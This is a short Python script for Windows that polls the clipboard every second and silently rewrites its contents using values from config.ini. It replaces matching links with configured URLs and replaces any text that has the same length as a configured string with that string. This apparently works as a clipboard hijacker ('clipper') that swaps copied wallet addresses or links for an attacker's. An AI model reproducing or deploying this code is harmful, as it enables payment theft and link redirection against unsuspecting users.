import win32clipboard
import time
import configparser
import sys

config = configparser.ConfigParser()
config.read('config.ini')

list_of_url = []
list_of_matching_url = []

list_of_match_number = []

def get_file_data():
    links = config.items('Short_Links')
    match_links = config.items('Short_Links_Matching')
    for i in range(1,len(links)+1):
        list_of_url.append(config.get('Short_Links','link_'+str(i)))
        list_of_matching_url.append(config.get('Short_Links_Matching','link_'+str(i)))

    match_number = config.items('Match_length')
    for i in range(1,len(match_number)+1):
        list_of_match_number.append(config.get('Match_length','data_'+str(i)))

def look_for_matching(data):
    for i in range(0,len(list_of_url)):
        if list_of_matching_url[i] in data:
            return list_of_url[i]

    for i in list_of_match_number:
        if len(i) == len(data):
            return i;
    return data

def openClipboard():
    win32clipboard.OpenClipboard()

def closeClipboard():
    try:
        win32clipboard.CloseClipboard()
    except Exception as e:
        print(e)

def getClipboardData():
    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
        return win32clipboard.GetClipboardData()
    else:
        return None

def setClipboardData(data):
    win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardData(win32clipboard.CF_UNICODETEXT, data)

if __name__ == '__main__':
    get_file_data()
    try:
        while True:
            openClipboard()
            data = getClipboardData()
            closeClipboard()

            openClipboard()
            new_data = look_for_matching(data)
            setClipboardData(new_data)
            closeClipboard()

            openClipboard()
            data = getClipboardData()
            closeClipboard()
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit()
